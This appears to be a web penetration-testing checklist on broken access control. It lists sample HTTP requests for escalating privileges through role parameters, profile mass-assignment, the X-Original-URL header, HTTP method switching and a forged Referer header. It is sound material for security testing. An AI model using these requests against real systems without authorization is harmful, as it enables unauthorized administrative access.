# Broken Access Control

## Methodology

* [ ] **User role controlled by request parameter**:

```bash
# GET:
GET /login/home.jsp?admin=true
GET /login/home.jsp?role=1
# POST:
POST /login/login.php

username=test&password=test&role=1
```

* [ ] **User role can be modified in user profile**: Add parameters like **roleid**, **id**, **admin** with values like "**true**", "**1**", "**0**", "**yes**", etc. when trying to update our profile with some functionality.

```bash
POST /update/email

email=test@test.com&roleid=1 # Add roleid
```

* [ ] URL-based access control can be circumvented:

```
POST / HTTP/1.1
...
X-Original-URL: /admin/change-password?pass=test123
```

* [ ] Method-based access control can be circumvented:

```bash
# Example (POST to GET):
## POST
POST /admin-api/update-roles

username=test&role=admin
## GET
GET /admin-api/update-roles?username=test&role=admin
```

* [ ] Referer-based access control:

```
GET /admin-api/update-roles?username=test&role=admin

Referer: http://website.com/admin
```

* [ ] [IDOR](idor.md)
